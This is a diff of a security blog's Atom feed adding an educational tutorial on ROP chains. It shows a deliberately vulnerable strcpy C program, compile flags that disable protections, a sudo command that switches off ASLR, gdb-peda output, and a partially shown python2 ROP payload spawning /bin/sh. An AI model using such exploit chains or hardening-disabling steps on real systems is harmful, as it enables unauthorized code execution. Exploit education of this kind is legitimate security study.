@@ -1,4 +1,263 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://cyber-rosh.github.io/musings/feed.xml" rel="self" type="application/atom+xml" /><link href="https://cyber-rosh.github.io/musings/" rel="alternate" type="text/html" /><updated>2021-06-17T11:44:29+05:30</updated><id>https://cyber-rosh.github.io/musings/feed.xml</id><title type="html">The Rosh</title><subtitle>This site is about collection of articles on anything related to Cyber Security.</subtitle><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><entry><title type="html">Understanding SSH Tunnelling and Proxychains</title><link href="https://cyber-rosh.github.io/musings/ssh-tunnel/" rel="alternate" type="text/html" title="Understanding SSH Tunnelling and Proxychains" /><published>2021-06-07T00:00:00+05:30</published><updated>2021-06-07T00:00:00+05:30</updated><id>https://cyber-rosh.github.io/musings/ssh-tunnel</id><content type="html" xml:base="https://cyber-rosh.github.io/musings/ssh-tunnel/">&lt;p&gt;Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://cyber-rosh.github.io/musings/feed.xml" rel="self" type="application/atom+xml" /><link href="https://cyber-rosh.github.io/musings/" rel="alternate" type="text/html" /><updated>2021-06-20T16:06:35+05:30</updated><id>https://cyber-rosh.github.io/musings/feed.xml</id><title type="html">The Rosh</title><subtitle>This site is about collection of articles on anything related to Cyber Security.</subtitle><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><entry><title type="html">Wading through the maze of ROP chains</title><link href="https://cyber-rosh.github.io/musings/buffer%20overflow/rop%20chain/rop-chains/" rel="alternate" type="text/html" title="Wading through the maze of ROP chains" /><published>2021-06-19T14:34:00+05:30</published><updated>2021-06-19T14:34:00+05:30</updated><id>https://cyber-rosh.github.io/musings/buffer%20overflow/rop%20chain/rop-chains</id><content type="html" xml:base="https://cyber-rosh.github.io/musings/buffer%20overflow/rop%20chain/rop-chains/">&lt;p align=&quot;center&quot;&gt;&lt;i&gt;Birds Eye View and the Deep Dive Series&lt;/i&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;birds-eye-view&quot;&gt;Birds Eye View&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;&lt;em&gt;The main idea of Return Oriented Programming (ROP) is to chain and run the instructions which are already present in the code to the attackers advantage.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;getting-to-know-buffer-overflows&quot;&gt;Getting to know Buffer Overflows&lt;/h3&gt;
+
+&lt;p&gt;In buffer overflow vulnerabilities one of the most common methods used by the attacker was to write the shellcode onto the stack and then to execute this shellcode. The execution of the shellcode was achieved by controlling the EIP, and pointing it to the start of the shellcode. The buffer overflow attacks have targeted both stack and heap memory regions for exploiting these vulnerabilities.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;&lt;em&gt;The key to successful buffer overflow attack is to control the Instruction Pointer (IP).&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In order to mitigate the effect of the buffer overflow vulnerabilities we have following mitigations in place:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Stack Canaries&lt;/em&gt;&lt;/strong&gt;: This is a compiler level protection. These are inserted by the compilers at compile time into the binaries. Different compilers have different ways by which they accomplish it.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Data Execution Prevention (DEP)&lt;/em&gt;&lt;/strong&gt;: This is supported at the hardware level by way of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NX&lt;/code&gt; bit. Setting or unsetting this bit will make the address space executable or non-executable. We can control it through software.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;&lt;em&gt;Address Space Layout Randomization (ASLR)&lt;/em&gt;&lt;/strong&gt;: Here we randomize the address space of various segments of the program, so that they don’t have fixed address which can be easily exploited by the malicious actors. ASLR can be enabled or disable at the operation system level. In linux we have additional features to control it at program level also.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;where-do-the-rops-fit-in&quot;&gt;Where do the ROPs fit in?&lt;/h3&gt;
+&lt;p&gt;In Return Oriented Programming (ROP) we chain the gadgets in such a way that we are able to obtain the shell (command prompt) on the vulnerable system. It is primarily used to bypass the DEP safeguards.&lt;/p&gt;
+
+&lt;h3 id=&quot;and-what-do-you-mean-by-gadgets&quot;&gt;And what do you mean by gadgets?&lt;/h3&gt;
+&lt;p&gt;Well, these are a group of instructions which end with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;. Some of the useful ROP gadgets are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Loading constant into register &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop eax; ret&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Loading from memory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov ebx, [eax]; ret&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Store in memory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov [eax], ebx; ret&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Arithmetic operations &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor eax, eax; ret&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;System calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int 0x80; ret&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;deep-dive&quot;&gt;Deep Dive&lt;/h1&gt;
+&lt;p&gt;Having the background lets try to take a deep dive and understand what the hullabaloo is about.&lt;/p&gt;
+
+&lt;h3 id=&quot;our-objective-is-to-launch-binsh-shell&quot;&gt;Our objective is to launch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; shell&lt;/h3&gt;
+
+&lt;p&gt;We will make use of following steps:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Write &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; string in memory&lt;/li&gt;
+  &lt;li&gt;Setup &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; syscall number&lt;/li&gt;
+  &lt;li&gt;Setup &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; arguments&lt;/li&gt;
+  &lt;li&gt;Syscall gadgets&lt;/li&gt;
+  &lt;li&gt;Find syscall interrupt&lt;/li&gt;
+  &lt;li&gt;Build the ROP chain as a python script&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;building-the-rop-chain&quot;&gt;Building the ROP Chain&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int execve(const char *filename, char *const argv[], char *const
+envp[]);&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop ebx&lt;/code&gt; - first argument&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop ecx&lt;/code&gt; - second argument&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop edx&lt;/code&gt; - third argument&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor eax, eax&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;used to initialize the context to zero&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inc eax&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;used 11 times to setup the execve syscall number&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int 0x80&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;syscall exception&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;example-exploitation&quot;&gt;Example Exploitation&lt;/h3&gt;
+&lt;p&gt;Let’s take a vulnerable buffer overflow example code:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*rop.c*/
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+int main(int argc,char *argv[]){
+	char buf[10];
+	strcpy(buf,argv[1]);
+	printf(&quot;Buf:%s\n&quot;,buf);
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;compiling-the-above-program&quot;&gt;Compiling the above program&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc -ggdb -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -znoexecstack
+rop.c -o rop
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-m32&lt;/code&gt;: For output in 32 bit binary format.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ggdb&lt;/code&gt;: Enable debug info.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt;: GCC will align stack pointer on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2^2=4byte&lt;/code&gt; boundary.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fno-stack-protector&lt;/code&gt;: To disable stack canaries.&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;znoexecstack&lt;/code&gt;: Enable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NX&lt;/code&gt; to make stack non executable&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;disable-aslr&quot;&gt;Disable ASLR&lt;/h3&gt;
+&lt;p&gt;ASLR has following flags options&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;:  No Randomization&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;: Conservative Randomization
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shared libraries&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Stack&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mmap&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VDSO&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Heap&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2&lt;/code&gt; Full Randomization
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Brk()&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For ease of understanding let us switch off the ASLR:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;check-the-security-attributes-of-binary-using-gdb-peda&quot;&gt;Check the security attributes of binary using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb-peda&lt;/code&gt;&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb-peda -q ./rop
+Reading symbols from ./rop...done.
+
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;find-the-offset-to-eip&quot;&gt;Find the offset to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EIP&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;Now, let’s find the offset to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EIP&lt;/code&gt; in this program using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_create&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pattern_offset&lt;/code&gt; commands:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ pattern_create 50 patt.txt
+gdb-peda$ r $(cat patt.txt)
+Stopped reason: SIGSEGV
+0x2d414143 in ?? ()
+gdb-peda$ pattern_offset 0x2d414143
+759251267 found at offset: 18
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;find-gadgets-and-build-the-rop-chain&quot;&gt;Find gadgets and build the ROP chain&lt;/h3&gt;
+&lt;p&gt;We have to find the required gadgets from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; library used by our program. In order to find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; version, load the program in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb-peda&lt;/code&gt; and put a breakpoint at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ b main
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Run the program and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vmmap&lt;/code&gt; to see the modules loaded by the program&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ vmmap
+Start      End        Perm	Name
+0x56555000 0x56556000 r-xp	/home/cdac/prac-examples/rop
+0x56556000 0x56557000 r--p	/home/cdac/prac-examples/rop
+0x56557000 0x56558000 rw-p	/home/cdac/prac-examples/rop
+0xf7ddd000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb2000 0xf7fb3000 ---p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb3000 0xf7fb5000 r--p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb5000 0xf7fb6000 rw-p	/lib/i386-linux-gnu/libc-2.27.so
+0xf7fb6000 0xf7fb9000 rw-p	mapped
+0xf7fcf000 0xf7fd1000 rw-p	mapped
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here, we can see the version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt; that is getting loaded at runtime. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lib/i386-linux-gnu/libc-2.27.so&lt;/code&gt; is getting loaded at the base address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7ddd000&lt;/code&gt;. We will now use the following command to search for gadgets and create a chain using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROPGadget&lt;/code&gt; tool&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ROPgadget --ropchain --binary /lib/i386-linux-gnu/libc-2.27.so &amp;gt; ./gadgets.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The gadgets found will be saved in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gadgets.txt&lt;/code&gt; file. At the end of the file we can see that a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python2&lt;/code&gt; code will be generated for ROP chain to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;. Let us have a peep inside this file&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Unique gadgets found: 118662
+
+ROP chain generation
+===========================================================
+- Step 5 -- Build the ROP chain
+
+	#!/usr/bin/env python2
+	# execve generated by ROPgadget
+
+	from struct import pack
+
+	# Padding goes here
+	p = ''
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The addresses inside the ROP chain will be offsets inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so&lt;/code&gt; library. We have to add the base address that we have noted earlier. After adding the base address and the offset for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EIP&lt;/code&gt;, the python script will look as follows:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python2
+# execve generated by ROPgadget
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Offset to EIP
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Add the base address of the libc.so library
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7ddd000&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Put the address of .data section will be moved into edx register
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00001aae&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop edx ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001d8040&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# @ .data
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Address of '/bin' string into eax register
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024c1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/bin'&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Mov '/bin' string to start of .data section
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00075655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mov dword ptr [edx], eax ; ret
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Mov '//sh' string to .data+4 section
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00001aae&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop edx ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001d8044&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# @ .data + 4
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00024c1e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop eax ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'//sh'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00075655&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# mov dword ptr [edx], eax ; ret
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Now, we have to give two more arguments to the execve() function, which can be null
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00001aae&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop edx ; ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x001d8048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# @ .data + 8
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0002e565&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# xor eax, eax ; ret
